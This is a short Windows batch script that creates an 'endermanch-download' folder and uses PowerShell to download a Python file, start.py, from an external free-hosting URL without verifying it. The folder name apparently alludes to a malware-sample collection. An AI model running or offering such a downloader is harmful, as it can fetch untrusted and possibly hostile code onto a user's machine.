@echo off
mkdir endermanch-download
PowerShell -Command Invoke-WebRequest -Uri http://mdl2.x10.mx/start.py -OutFile .\endermanch-download\start.py